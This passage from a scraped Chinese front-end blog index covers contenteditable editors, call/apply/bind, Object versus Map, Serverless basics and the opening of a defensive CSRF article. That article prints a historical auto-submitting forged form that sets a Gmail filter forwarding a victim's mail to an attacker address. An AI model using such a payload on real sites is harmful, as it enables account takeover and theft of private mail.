封装了注册规则的方法和执行过滤的方法，参数就是根据编辑器内容的 dom 转化而来的 uNode 对象，基于该对象执行具体的过滤） 整个 UEditor 正是围绕着这些核心对象构建的，并且在此基础上提供了大量的 API 以便开发者进行定制化的开发，显然作为一个 contenteditable 编辑器它已经足够成熟了 但在实际的生产环境中，面对不同的产品需求我们依然需要处理一些棘手的情况 固定结构内容一个常见的场景是，固定结构内容，比如图片与图片注释 这就是一个典型的固定结构内容，编辑器中出现了一个不可更改的固定搭配，即图片后面必须跟着注释输入框 来看看要实现这个需求需要考虑哪些要问题 图片和注释元素必须一对一 图片和注释元素的位置顺序不能改变 光标不允许插入到固定结构中间 光标可以定位在注释元素里 注释元素里只能放纯文本 contenteditable 编辑器的设计原则之一是编辑器内的一切内容皆可自由编辑，而固定结构元素某种程度上违背了这一原则，这会带来很多问题，用户有太多方法可以破坏你预设的结构 一种常见的解决方案是将固定结构的元素包裹在一个不可编辑元素内，并为其中的可交互元素独立设置交互事件（比如点击输入、粘贴内容过滤） 但这还不够，有几个问题： 编辑器中存在不可编辑元素，会有浏览器兼容性的问题，如火狐浏览器下光标无法正确移动甚至无法删除这个元素 两个不可编辑器的块级元素在相邻位置时，光标无法插入中间，退格键也会同时删除多个 复制粘贴这个内容，结构可能会错乱 其他操作也可能会破坏结构 为了解决上述问题，就需要劫持用户的光标操作（鼠标点击、方向键、退格键），同时设立一套结构规则来检查当前结构是否有错乱 简而言之，就是通过劫持，判断光标是否处于不可编辑元素的最近位置，符合条件时，用自定义行为代理浏览器默认的选择、删除、复制剪切等行为 再通过对光标移动事件（onSelectionChange）的监听，检查内容中的固定结构是否符合规则（如两个不可编辑元素之间必须至少存在一个用于插入光标的空行标签等） 面对固定结构内容，根据不同的使用场景，可以有两种解决方案， 对于结构简单但需要进行交互的场景，就像图片注释那样，可以使用前面提到的 contenteditable=false+行为劫持+过滤规则的方式实现 对于结构较为复杂但不需要进行交互或交互场景较为简单的情况，则可以使用 canvas 来实现 使用 canvas 的好处是不用担心结构问题，这完全就是一张图片，如果在文章发布后需要其他交互也可以在详情页将之转化为正常的 DOM 结构，缺点是生成的图片需要上传至图片服务器这会占用额外的存储资源 另一个需要考虑的问题是在 safari 浏览器下如果画布上有其他域过来的图片，就算设置了允许跨域也会被 safari 的安全策略 block[SecurityError (DOM Exception 18): The operation is insecure.]，这就可能需要使用本地占位图来解决 可以根据实际情况来选择解决方案 光标除此之外，UE 也存在一些作为 contenteditable 编辑器的通病，一个最常见的问题就是光标的视觉位置与逻辑位置的问题 试想有这么一段标红的粗体文本 当我们将光标放在这段文字的开头，我们会发现，光标的实际位置有 4 种可能 |&lt;p&gt;&lt;span ... &lt;p&gt;|&lt;span class=&quot;font-color-red-01&quot;&gt;... &lt;p&gt;&lt;span class=&quot;font-color-red-01&quot;&gt;|&lt;strong&gt;... &lt;p&gt;&lt;span class=&quot;font-color-red-01&quot;&gt;&lt;strong&gt;|text content 尽管视觉上的表现没有什么区别，但光标在不同位置时用户进行某些操作就会产生不同的结果 原本我们只是想用退格键将标题上移一行，但由于光标位置在 &lt;h1&gt;|...&lt;/h1&gt; 的位置上，结果将标题的格式也给清空了 解决方法也很简单，还是 劫持=&gt;判断=&gt;代理，这也是编辑器对光标进行严格控制的通用解决方案 撤销重做堆栈撤销重做堆栈也是一个问题，正常情况下 undoManager 会按照一个最小时间段自动记录每一次的内容变化，以便用户撤销回上一步的状态，但这也会带来一些问题，试想一个这样的场景 我们从本地插入一张图片，这张图片最终需要上传到服务器上，所以我们先在编辑器内插入了一个占位图，然后开始上传本地图片，等服务器返回了正确的图片地址后，再将正确的图片元素替换到占位图所在的位置上，顺便为图片添加图片注释的组件 那么 （插入占位图 =&gt; 上传图片 =&gt; 替换占位图 =&gt; 添加附加组件）就是一个完整的事件流，如果 undoManager 单独记录了这个事件流中每一个步骤，当用户执行撤销操作的时候就会出现问题 因此我们需要为自动记录设置一个暂停开关，这样就可以控制 undoManager 的记录时机 生命周期钩子为了使编辑器更加稳定，我们还可以通过 eventBase 来设计某些事件的生命周期钩子 比如可以分发撤销、重做操作完成前后的回调来做一系列额外的处理，也可以对图片上传的过程分发钩子函数 富文本编辑器的话题其实远不止上面这些，比如如何优雅的与编辑器内元素进行交互，如何由 State 驱动 Dom，如何做移动端的适配，表格操作等等，每一点都可以深入探讨，篇幅有限，这里就不再展开 总结一下，基于 contenteditable 编辑器稳定可靠的定制开发要注意的几个点 严格控制内容（格式规则检查、内容输入和输出过滤） 严格控制光标（劫持、检查、代理） 控制撤销重做堆栈 为一些关键操作添加生命周期钩子","link":"/front-end/contenteditable/"},{"title":"call、apply、bind 的理解","text":"作者：凹凸实验室链接：https://juejin.cn/post/6844903444235419656 call()语法： 1fun.call(thisArg[, arg1[, arg2[, ...]]]) thisArg：fun 函数运行时指定的 this 值，可能的值为： 不传，或者传 null，undefined， this 指向 window 对象 传递另一个函数的函数名 fun2，this 指向函数 fun2 的引用 值为原始值(数字，字符串，布尔值),this 会指向该原始值的自动包装对象，如 String、Number、Boolean 传递一个对象，函数中的 this 指向这个对象 例如： 1234567function a() { console.log(this);}function b() {}a.call(b); 经常会看到这种使用情况： 12345function list() { return Array.prototype.slice.call(arguments);}list(1, 2, 3); 为什么能实现这样的功能将 arguments 转成数组？首先 call 了之后，this 指向了所传进去的 arguments。我们可以假设 slice 方法的内部实现是这样子的：创建一个新数组，然后 for 循环遍历 this，将 this[i]一个个地赋值给新数组，最后返回该新数组。因此也就可以理解能实现这样的功能了。 apply()语法： 1fun.apply(thisArg[, argsArray]) 例如： 1234var numbers = [5, 6, 2, 3, 7];var max = Math.max.apply(null, numbers);console.log(max); // 7 平时 Math.max 只能这样子用：Math.max(5,6,2,3,7); 利用 apply 的第二个参数是数组的特性，从而能够简便地从数组中找到最大值。 bind()语法： 1fun.bind(thisArg[, arg1[, arg2[, ...]]]); bind()方法会创建一个新函数，称为绑定函数。 bind 是 ES5 新增的一个方法，不会执行对应的函数（call 或 apply 会自动执行对应的函数），而是返回对绑定函数的引用。 当调用这个绑定函数时，thisArg 参数作为 this，第二个以及以后的参数加上绑定函数运行时本身的参数按照顺序作为原函数的参数来调用原函数。 简单地说，bind 会产生一个新的函数，这个函数可以有预设的参数。 1234567function list() { return Array.prototype.slice.call(arguments);}var leadingThirtysevenList = list.bind(undefined, 37);var list = leadingThirtysevenList(1, 2, 3);console.log(list); 把类数组换成真正的数组，bind 能够更简单地使用： 12var slice = Array.prototype.slice;slice.apply(arguments); 123var unboundSlice = Array.prototype.slice;var slice = Function.prototype.apply.bind(unboundSlice);slice(arguments); 区别 相同之处： 改变函数体内 this 的指向。 不同之处： call、apply的区别：接受参数的方式不一样。 bind：不立即执行。而apply、call 立即执行。","link":"/front-end/js_call/"},{"title":"JS 项目中究竟应该使用 Object 还是 Map？","text":"在日常的 JavaScript 项目中，我们最常用到的数据结构就是各种形式的键值对格式了（key-value pair）。在 JavaScript 中，除了最基础的 Object 是该格式外，ES6 新增的 Map 也同样是键值对格式。它们的用法在很多时候都十分接近。不知道有没有人和我一样纠结过该选择哪个去使用呢？在本菜最近的项目中，我又遇到了这样的烦恼，索性一不做二不休，去对比一下究竟该使用哪一个。 本文将会探讨一下 Object 和 Map 的不同，从多个角度对比一下 Object 和 Map： 用法的区别：在某些情况下的用法会截然不同 句法的区别：创建以及增删查改的句法区别 性能的区别：速度和内存占用情况 希望读完本文的你可以在日后的项目中做出更为合适的选择。 作者：掘金开发者社区链接：https://zhuanlan.zhihu.com/p/358378689 用法对比 对于 Object 而言，它键（key）的类型只能是字符串，数字或者 Symbol；而对于 Map 而言，它可以是任何类型。（包括 Date，Map，或者自定义对象） Map 中的元素会保持其插入时的顺序；而 Object 则不会完全保持插入时的顺序，而是根据如下规则进行排序: 非负整数会最先被列出，排序是从小到大的数字顺序 然后所有字符串，负整数，浮点数会被列出，顺序是根据插入的顺序 最后才会列出 Symbol，Symbol 也是根据插入的顺序进行排序的 读取 Map 的长度很简单，只需要调用其 .size() 方法即可；而读取 Object 的长度则需要额外的计算： Object.keys(obj).length Map 是可迭代对象，所以其中的键值对是可以通过 for of 循环或 .foreach() 方法来迭代的；而普通的对象键值对则默认是不可迭代的，只能通过 for in 循环来访问（或者使用 Object.keys(o)、Object.values(o)、Object.entries(o) 来取得表示键或值的数字）迭代时的顺序就是上面提到的顺序。 1234const o = {};const m = new Map();o[Symbol.iterator] !== undefined; // falsem[Symbol.iterator] !== undefined; // true 在 Map 中新增键时，不会覆盖其原型上的键；而在 Object 中新增键时，则有可能覆盖其原型上的键: 12345Object.prototype.x = 1;const o = { x: 2 };const m = new Map([[x, 2]]);o.x; // 2，x = 1 被覆盖了m.x; // 1，x = 1 不会被覆盖 JSON 默认支持 Object 而不支持 Map。若想要通过 JSON 传输 Map 则需要使用到 .toJSON() 方法，然后在 JSON.parse() 中传入复原函数来将其复原。对于 JSON 这里就不具体展开了，有兴趣的朋友可以看一下这：JSON 的序列化和解析 1234const o = { x: 1 };const m = new Map([[&quot;x&quot;, 1]]);const o2 = JSON.parse(JSON.stringify(o)); // {x:1}const m2 = JSON.parse(JSON.stringify(m)); // {} 句法对比创建时的区别Obejct 123const o = {}; // 对象字面量const o = new Object(); // 调用构造函数const o = Object.create(null); // 调用静态方法 Object.create 对于 Object 来说，我们在 95%+ 的情况下都会选择对象字面量，它不仅写起来最简单，而且相较于下面的函数调用，在性能方面会更为高效。对于构建函数，可能唯一使用到的情况就是显式的封装一个基本类型；而 Object.create 可以为对象设定原型。 Map 1const m = new Map(); // 调用构造函数 和 Object 不同，Map 没有那么多花里胡哨的创建方法，通常只会使用其构造函数来创建。 除了上述方法之外，我们也可以通过 Function.prototype.apply()、Function.prototype.call()、reflect.apply()、Reflect.construct() 方法来调用 Object 和 Map 的构造函数或者 Object.create() 方法，这里就不展开了。 新增/读取/删除元素时的区别Object 123456789101112const o = {};//新增/修改o.x = 1;o[&quot;y&quot;] = 2;//读取o.x; // 1o[&quot;y&quot;]; // 2//或者使用 ES2020 新增的条件属性访问表达式来读取o?.x; // 1o?.[&quot;y&quot;]; // 2//删除delete o.b; 对于新增元素，看似使用第一种方法更为简单，不过它也有些许限制： 属性名不能包含空格和标点符号 属性名不能以数字开头 对于条件属性访问表达式的更多内容可以看一下这：条件属性访问表达式 Map 1234567const m = new Map();//新增/修改m.set(&quot;x&quot;, 1);//读取map.get(&quot;x&quot;);//删除map.delete(&quot;b&quot;); 对于简单的增删查改来说，Map 上的方法使用起来也是十分便捷的；不过在进行联动操作时，Map 中的用法则会略显臃肿： 123456789const m = new Map([[&quot;x&quot;, 1]]);// 若想要将 x 的值在原有基础上加一，我们需要这么做：m.set(&quot;x&quot;, m.get(&quot;x&quot;) + 1);m.get(&quot;x&quot;); // 2const o = { x: 1 };// 在对象上修改则会简单许多：o.x++;o.x; // 2 性能对比接下来我们来讨论一下 Object 和 Map 的性能。不知道各位有没有听说过 Map 的性能优于 Object 的说法，我反正是见过不少次，甚至在 JS 高程四中也提到了 Map 对比 Object 时性能的优势；不过对于性能的概括都十分的笼统，所以我打算做一些测试来对比一下它们的区别。 测试方法在这里我进行的对于性能测试的都是基于 v8 引擎的。速度会通过 JS 标准库自带的 performance.now() 函数来判断，内存使用情况会通过 Chrome devtool 中的 memory 来查看。 对于速度测试，因为单一的操作速度太快了，很多时候 performance.now() 会返回 0。所以我进行了 10000 次的循环然后判断时间差。因为循环本身也会占据一部分时间，所以以下的测试只能作为一个大致的参考。 创建时的性能测试用的代码如下： 123456789101112131415161718192021222324let n, n2 = 5;// 速度while (n2--) { let p1 = performance.now(); n = 10000; while (n--) { let o = {}; } let p2 = performance.now(); n = 10000; while (n--) { let m = new Map(); } let p3 = performance.now(); console.log( `Object: ${(p2 - p1).toFixed(3)}ms, Map: ${(p3 - p2).toFixed(3)}ms` );}// 内存class Test {}let test = new Test();test.o = o;test.m = m; 首先进行对比的是创建 Object 和 Map 时的表现。对于创建的速度表现如下： 我们可以发现创建 Object 的速度会快于 Map。对于内存使用情况则如下： 我们主要关注其 Retained Size，它表示了为其分配的空间。（即删除时释放的内存大小） 通过对比我们可以发现，空的 Object 会比空的 Map 占用更少的内。所以这一轮 Object 赢得一筹。 新增元素时的性能测试用的代码如下： 123456789101112131415161718192021222324252627console.clear();let n, n2 = 5;let o = {}, m = new Map();// 速度while (n2--) { let p1 = performance.now(); n = 10000; while (n--) { o[Math.random()] = Math.random(); } let p2 = performance.now(); n = 10000; while (n--) { m.set(Math.random(), Math.random()); } let p3 = performance.now(); console.log( `Object: ${(p2 - p1).toFixed(3)}ms, Map: ${(p3 - p2).toFixed(3)}ms` );}// 内存class Test {}let test = new Test();test.o = o;test.m = m; 对于新建元素时的速度表现如下： 我们可以发现新建元素时，Map 的速度会快于 Object。对于内存使用情况则如下： 通过对比我们可以发现，在拥有一定数量的元素时， Object 会比 Map 占用多了约 78% 的内存。我也进行了多次的测试，发现在拥有足够的元素时，这个百分比是十分稳定的。所以说，在需要进行很多新增操作，且需要储存许多数据的时候，使用 Map 会更高效。 读取元素时的性能测试用的代码如下： 1234567891011121314151617181920212223let n;let o = {}, m = new Map();n = 10000;while (n--) { o[Math.random()] = Math.random();}n = 10000;while (n--) { m.set(Math.random(), Math.random());}let p1 = performance.now();for (key in o) { let k = o[key];}let p2 = performance.now();for ([key] of m) { let k = m.get(key);}let p3 = performance.now();`Object: ${(p2 - p1).toFixed(3)}ms, Map: ${(p3 - p2).toFixed(3)}ms`; 对于读取元素时的速度表现如下： 通过对比，我们可以发现 Object 略占优势，但总体差别不大。 删除元素时的性能不知道大家是否听说过 delete 操作符性能低下，甚至有很多时候为了性能，会宁可将值设置为 undefined 而不使用 delete 操作符的说法。但其实在 v8 近来的优化下，它的效率已经提升许多了。 测试用的代码如下： 1234567891011121314151617181920212223let n;let o = {}, m = new Map();n = 10000;while (n--) { o[Math.random()] = Math.random();}n = 10000;while (n--) { m.set(Math.random(), Math.random());}let p1 = performance.now();for (key in o) { delete o[key];}let p2 = performance.now();for ([key] of m) { m.delete(key);}let p3 = performance.now();`Object: ${(p2 - p1).toFixed(3)}ms, Map: ${(p3 - p2).toFixed(3)}ms`; 对于删除元素时的速度表现如下： 我们可以发现在进行删除操作时，Map 的速度会略占优，但整体差别其实并不大。 特殊情况其实除了最基本的情况之外，还有一种特殊的情况。还记得我们在前面提到的 Object 中键的排序吗？我们提到了其中的非负整数会被最先列出。其实对于非负整数作为键的值和其余类型作为键的值来说，v8 是会对它们进行区别对待的。负整数作为键的部分会被当成数组对待，即非负整数具有一定的连续性时，会被当成快数组，而过于稀疏时会被当成慢数组。 对于快数组，它拥有连续的内存，所以在进行读写时会更快，且占用更少的内存。更多的内容可以看一下这: 探究 JS V8 引擎下的“数组”底层实现 在键为连续非负整数时，性能如下： 我们可以看到 Object 不仅平均速度更快了，其占用的内存也大大减少了。 总结通过对比我们可以发现，Map 和 Object 各有千秋，对于不同的情况下，我们应当作出不同的选择。所以我总结了一下我认为使用 Map 和 Object 更为合适的时机。 使用 Map： 储存的键不是字符串/数字/或者 Symbol 时，选择 Map，因为 Object 并不支持 储存大量的数据时，选择 Map，因为它占用的内存更小 需要进行许多新增/删除元素的操作时，选择 Map，因为速度更快 需要保持插入时的顺序的话，选择 Map，因为 Object 会改变排序 需要迭代/遍历的话，选择 Map，因为它默认是可迭代对象，迭代更为便捷 使用 Object： 只是简单的数据结构时，选择 Object，因为它在数据少的时候占用内存更少，且新建时更为高效 需要用到 JSON 进行文件传输时，选择 Object，因为 JSON 不默认支持 Map 需要对多个键值进行运算时，选择 Object，因为句法更为简洁 需要覆盖原型上的键时，选择 Object 虽然 Map 在很多情况下会比 Object 更为高效，不过 Object 永远是 JS 中最基本的引用类型，它的作用也不仅仅是为了储存键值对。","link":"/front-end/js_object_or_map/"},{"title":"Serverless（无服务）基础知识","text":"Serverless 架构即“无服务器”架构，它是一种全新的架构方式，是云计算时代一种革命性的架构模式。与云计算、容器和人工智能一样，Serverless 是这两年 IT 行业的一个热门词汇，它在各种技术文章和论坛上都有很高的曝光度。 作者：凹凸实验室链接：https://juejin.cn/post/6844903904224903181 什么是 ServerlessServerless 圈内俗称为“无服务器架构”，Serverless 不是具体的一个编程框架、类库或者工具。简单来说，Serverless 是一种软件系统架构思想和方法，它的核心思想是用户无须关注支撑应用服务运行的底层主机。这种架构的思想和方法将对未来软件应用的设计、开发和运营产生深远的影响。 所谓“无服务器”，并不是说基于 Serverless 架构的软件应用不需要服务器就可以运行，其指的是用户无须关心软件应用运行涉及的底层服务器的状态、资源（比如 CPU、内存、磁盘及网络）及数量。软件应用正常运行所需要的计算资源由底层的云计算平台动态提供。 Serverless 的技术实现Serverless 的核心思想是让作为计算资源的服务器不再成为用户所关注的一种资源。其目的是提高应用交付的效率，降低应用运营的工作量和成本。以 Serverless 的思想作为基础实现的各种框架、工具及平台，是各种 Serverless 的实现（Implementation）。Serverless 不是一个简单的工具或框架。用户不可能简单地通过实施某个产品或工具就能实现 Serverless 的落地。但是，要实现 Serverless 架构的落地，需要一些实实在在的工具和框架作为有力的技术支撑和基础。 随着 Serverless 的日益流行，这几年业界已经出现了多种平台和工具帮助用户进行 Serverless 架构的转型和落地。目前市场上比较流行的 Serverless 工具、框架和平台 有： AWS Lambda，最早被大众所认可的 Serverless 实现。 Azure Functions，来自微软公有云的 Serverless 实现。 OpenWhisk，Apache 社区的开源 Serverless 框架。 Kubeless，基于 Kubernetes 架构实现的开源 Serverless 框架。 Fission，Platform9 推出的开源 Serverless 框架。 OpenFaaS，以容器技术为核心的开源 Serverless 框架。 Fn，来自 Oracle 的开源 Serverless 框架，由原 Iron Functions 团队开发。 列举的 Serverless 实现有的是公有云的服务，有的则是框架工具，可以被部署在私有数据中心的私有云中（私有云 Serverless 框架 OpenWhisk、Fission 及 OpenFaaS）。每个 Serverless 服务或框架的实现都不尽相同，都有各自的特点。 FaaS 与 BaaSIT 是一个永远都不消停的行业，在这个行业里不断有各种各样新的名词和技术诞生，云计算（Cloud Computing）的出现是 21 世纪 IT 业界最重大的一次变革。云计算的发展从基础架构即服务（Infrastructure as a Service， IaaS），平台即服务（Platform as a Service，PaaS），软件即服务（Software as a Service，SaaS），慢慢开始演变到函数即服务（Function as a Service，FaaS）以及后台即服务（Backend as a Service，BaaS），Serverless 无服务化。 目前业界的各类 Serverless 实现按功能而言，主要为应用服务提供了两个方面的支持：函数即服务（Function as a Service，FaaS）以及后台即服务（Backend as a Service，BaaS）。 FaaSFaaS 提供了一个计算平台，在这个平台上，应用以一个或多个函数的形式开发、运行和管理。FaaS 平台提供了函数式应用的运行环境，一般支持多种主流的编程语言，如 Java、PHP 及 Python 等。FaaS 可以根据实际的访问量进行应用的自动化动态加载和资源的自动化动态分配。大多数 FaaS 平台基于事件驱动（Event Driven）的思想，可以根据预定义的事件触发指定的函数应用逻辑。 目前业界 FaaS 平台非常成功的一个代表就是 AWS Lambda 平台。AWS Lambda 是 AWS 公有云服务的函数式计算平台。通过 AWS Lambda，AWS 用户可以快速地在 AWS 公有云上构建基于函数的应用服务。 BaaS为了实现应用后台服务的 Serverless 化，BaaS（后台即服务）也应该被纳入一个完整的 Serverless 实现的范畴内。通过 BaaS 平台将应用所依赖的第三方服务，如数据库、消息队列及存储等服务化并发布出来，用户通过向 BaaS 平台申请所需要的服务进行消费，而不需要关心这些服务的具体运维。 BaaS 涵盖的范围很广泛，包含任何应用所依赖的服务。一个比较典型的例子是数据库即服务（Database as a Service，DBaaS）。许多应用都有存储数据的需求，大部分应用会将数据存储在数据库中。传统情况下，数据库都是运行在数据中心里，由用户运维团队负责运维。在 DBaaS 的场景下，用户向 DBaaS 平台申请数据库资源，而不需要关心数据库的安装部署及运维。 Serverless 的技术特点为了实现解耦应用和服务器资源，实现服务器资源对用户透明，与传统架构相比，Serverless 架构在技术上有许多不同的特点。 按需加载 在 Serverless 架构下，应用的加载（load）和卸载（unload）由 Serverless 云计算平台控制。这意味着应用不总是一直在线的。只有当有请求到达或者有事件发生时才会被部署和启动。当应用空闲至一定时长时，应用会到达或者有事件发生时才会被部署和启动。当应用空闲至一定时长时，应用会被自动停止和卸载。因此应用并不会持续在线，不会持续占用计算资源。 事件驱动 Serverless 架构的应用并不总是一直在线，而是按需加载执行。应用的加载和执行由事件驱动，比如 HTTP 请求到达、消息队列接收到新的信息或存储服务的文件被修改了等。通过将不同事件来源（Event Source）的事件（Event）与特定的函数进行关联，实现对不同事件采取不同的反应动作，这样可以非常容易地实现事件驱动（Event Driven）架构。 状态非本地持久化 云计算平台自动控制应用实例的加载和卸载，且应用和服务器完全解耦，应用不再与特定的服务器关联。因此应用的状态不能，也不会保存在其运行的服务器之上，不能做到传统意义上的状态本地持久化。 非会话保持 应用不再与特定的服务器关联。每次处理请求的应用实例可能是相同服务器上的应用实例，也可能是新生成的服务器上的应用实例。因此，用户无法保证同一客户端的两次请求由同一个服务器上的同一个应用实例来处理。也就是说，无法做到传统意义上的会话保持（Sticky Session）。因此，Serverless 架构更适合无状态的应用。 自动弹性伸缩 Serverless 应用原生可以支持高可用，可以应对突发的高访问量。应用实例数量根据实际的访问量由云计算平台进行弹性的自动扩展或收缩，云计算平台动态地保证有足够的计算资源和足够数量的应用实例对请求进行处理。 应用函数化 每一个调用完成一个业务动作，应用会被分解成多个细颗粒度的操作。由于状态无法本地持久化，这些细颗粒度的操作是无状态的，类似于传统编程里无状态的函数。Serverless 架构下的应用会被函数化，但不能说 Serverless 就是 Function as a Service（FaaS）。Serverless 涵盖了 FaaS 的一些特性，可以说 FaaS 是 Serverless 架构实现的一个重要手段。 Serverless 的应用场景通过将 Serverless 的理念与当前 Serverless 实现的技术特点相结合，Serverless 架构可以适用于各种业务场景。 Web 应用 Serverless 架构可以很好地支持各类静态和动态 Web 应用。如 RESTful API 的各类请求动作（GET、POST、PUT 及 DELETE 等）可以很好地映射成 FaaS 的一个个函数，功能和函数之间能建立良好的对应关系。通过 FaaS 的自动弹性扩展功能，Serverless Web 应用可以很快速地构建出能承载高访问量的站点。 移动互联网 Serverless 应用通过 BaaS 对接后端不同的服务而满足业务需求，提高应用开发的效率。前端通过 FaaS 提供的自动弹性扩展对接移动端的流量，开发者可以更轻松地应对突发的流量增长。在 FaaS 的架构下，应用以函数的形式存在。各个函数逻辑之间相对独立，应用更新变得更容易，使新功能的开发、测试和上线的时间更短。 物联网（Internet of Things，IoT） 物联网（Internet of Things，IoT）应用需要对接各种不同的数量庞大的设备。不同的设备需要持续采集并传送数据至服务端。Serverless 架构可以帮助物联网应用对接不同的数据输入源。 多媒体处理 视频和图片网站需要对用户上传的图片和视频信息进行加工和转换。但是这种多媒体转换的工作并不是无时无刻都在进行的，只有在一些特定事件发生时才需要被执行，比如用户上传或编辑图片和视频时。通过 Serverless 的事件驱动机制，用户可以在特定事件发生时触发处理逻辑，从而节省了空闲时段计算资源的开销，最终降低了运维的成本。 数据及事件流处理 Serverless 可以用于对一些持续不断的事件流和数据流进行实时分析和处理，对事件和数据进行实时的过滤、转换和分析，进而触发下一步的处理。比如，对各类系统的日志或社交媒体信息进行实时分析，针对符合特定特征的关键信息进行记录和告警。 系统集成 Serverless 应用的函数式架构非常适合用于实现系统集成。用户无须像过去一样为了某些简单的集成逻辑而开发和运维一个完整的应用，用户可以更专注于所需的集成逻辑，只编写和集成相关的代码逻辑，而不是一个完整的应用。函数应用的分散式的架构，使得集成逻辑的新增和变更更加灵活。 Serverless 的局限世界上没有能解决所有问题的万能解决方案和架构理念。Serverless 有它的特点和优势，但是同时也有它的局限。有的局限是由其架构特点决定的，有的是目前技术的成熟度决定的，毕竟 Serverless 还是一个起步时间不长的新兴技术领域，在许多方面还需要逐步完善。 控制力 Serverless 的一个突出优点是用户无须关注底层的计算资源，但是这个优点的反面是用户对底层的计算资源没有控制力。对于一些希望掌控底层计算资源的应用场景，Serverless 架构并不是最合适的选择。 可移植性 Serverless 应用的实现在很大程度上依赖于 Serverless 平台及该平台上的 FaaS 和 BaaS 服务。不同 IT 厂商的 Serverless 平台和解决方案的具体实现并不相同。而且，目前 Serverless 领域尚没有形成有关的行业标准，这意味着用户将一个平台上的 Serverless 应用移植到另一个平台时所需要付出的成本会比较高。较低的可移植性将造成厂商锁定（Vendor Lock-in）。这对希望发展 Serverless 技术，但是又不希望过度依赖特定供应商的企业而言是一个挑战。 安全性 在 Serverless 架构下，用户不能直接控制应用实际所运行的主机。不同用户的应用，或者同一用户的不同应用在运行时可能共用底层的主机资源。对于一些安全性要求较高的应用，这将带来潜在的安全风险。 性能 当一个 Serverless 应用长时间空闲时将会被从主机上卸载。当请求再次到达时，平台需要重新加载应用。应用的首次加载及重新加载的过程将产生一定的延时。对于一些对延时敏感的应用，需要通过预先加载或延长空闲超时时间等手段进行处理。 执行时长 Serverless 的一个重要特点是应用按需加载执行，而不是长时间持续部署在主机上。目前，大部分 Serverless 平台对 FaaS 函数的执行时长存在限制。因此 Serverless 应用更适合一些执行时长较短的作业。 技术成熟度 虽然 Serverless 技术的发展很快，但是毕竟它还是一门起步时间不长的新兴技术。因此，目前 Serverless 相关平台、工具和框架还处在一个不断变化和演进的阶段，开发和调试的用户体验还需要进一步提升。Serverless 相关的文档和资料相对比较少，深入了解 Serverless 架构的架构师、开发人员和运维人员也相对较少。","link":"/backend/serverless-1/"},{"title":"如何防止CSRF攻击？","text":"随着互联网的高速发展，信息安全问题已经成为企业最为关注的焦点之一，而前端又是引发企业安全问题的高危据点。在移动互联网时代，前端人员除了传统的 XSS、CSRF 等安全问题之外，又时常遭遇网络劫持、非法调用 Hybrid API 等新型安全问题。当然，浏览器自身也在不断在进化和发展，不断引入 CSP、Same-Site Cookies 等新技术来增强安全性，但是仍存在很多潜在的威胁，这需要前端技术人员不断进行“查漏补缺”。 作者：美团技术团队链接：https://juejin.cn/post/6844903689702866952 近几年，美团业务高速发展，前端随之面临很多安全挑战，因此积累了大量的实践经验。我们梳理了常见的前端安全问题以及对应的解决方案，将会做成一个系列，希望可以帮助前端同学在日常开发中不断预防和修复安全漏洞。本文是该系列的第二篇。 今天我们讲解一下 CSRF，其实相比 XSS，CSRF 的名气似乎并不是那么大，很多人都认为“CSRF 不具备那么大的破坏性”。真的是这样吗？接下来，我们还是有请小明同学再次“闪亮”登场。 CSRF 漏洞的发生相比 XSS，CSRF 的名气似乎并不是那么大，很多人都认为 CSRF“不那么有破坏性”。真的是这样吗？ 接下来有请小明出场~~ 小明的悲惨遭遇这一天，小明同学百无聊赖地刷着 Gmail 邮件。大部分都是没营养的通知、验证码、聊天记录之类。但有一封邮件引起了小明的注意： 甩卖比特币，一个只要 998！！ 聪明的小明当然知道这种肯定是骗子，但还是抱着好奇的态度点了进去（请勿模仿）。果然，这只是一个什么都没有的空白页面，小明失望的关闭了页面。一切似乎什么都没有发生…… 在这平静的外表之下，黑客的攻击已然得手。小明的 Gmail 中，被偷偷设置了一个过滤规则，这个规则使得所有的邮件都会被自动转发到haker@hackermail.com。小明还在继续刷着邮件，殊不知他的邮件正在一封封地，如脱缰的野马一般地，持续不断地向着黑客的邮箱转发而去。 不久之后的一天，小明发现自己的域名已经被转让了。懵懂的小明以为是域名到期自己忘了续费，直到有一天，对方开出了 $650 的赎回价码，小明才开始觉得不太对劲。 小明仔细查了下域名的转让，对方是拥有自己的验证码的，而域名的验证码只存在于自己的邮箱里面。小明回想起那天奇怪的链接，打开后重新查看了“空白页”的源码： 1234567891011121314&lt;form method=&quot;POST&quot; action=&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_emc&quot; value=&quot;true&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_email&quot; value=&quot;hacker@hakermail.com&quot; /&gt; ..... &lt;input type=&quot;hidden&quot; name=&quot;irf&quot; value=&quot;on&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;nvp_bu_cftb&quot; value=&quot;Create Filter&quot; /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit();&lt;/script&gt; 这个页面只要打开，就会向 Gmail 发送一个 post 请求。请求中，执行了“Create Filter”命令，将所有的邮件，转发到“hacker@hakermail.com”。 小明由于刚刚就登陆了 Gmail，所以这个请求发送时，携带着小明的登录凭证（Cookie），Gmail 的后台接收到请求，验证了确实有小明的登录凭证，于是成功给小明配置了过滤器。 黑客可以查看小明的所有邮件，包括邮件里的域名验证码等隐私信息。拿到验证码之后，黑客就可以要求域名服务商把域名重置给自己。 小明很快打开 Gmail，找到了那条过滤器，将其删除。然而，已经泄露的邮件，已经被转让的域名，再也无法挽回了…… 以上就是小明的悲惨遭遇。而“点开一个黑客的链接，所有邮件都被窃取”这种事情并不是杜撰的，此事件原型是 2007 年 Gmail 的 CSRF 漏洞： www.davidairey.com/google-Gmai… 当然，目前此漏洞已被 Gmail 修复，请使用 Gmail 的同学不要慌张。 什么是 CSRFCSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。 一个典型的 CSRF 攻击有着如下的流程： 受害者登录 a.com，并保留了登录凭证（Cookie）。 攻击者引诱受害者访问了 b.com。 b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会… a.com 接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。 a.com 以受害者的名义执行了 act=xx。 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让 a.com 执行了自己定义的操作。 几种常见的攻击类型 GET 类型的 CSRF GET 类型的 CSRF 利用非常简单，只需要一个 HTTP 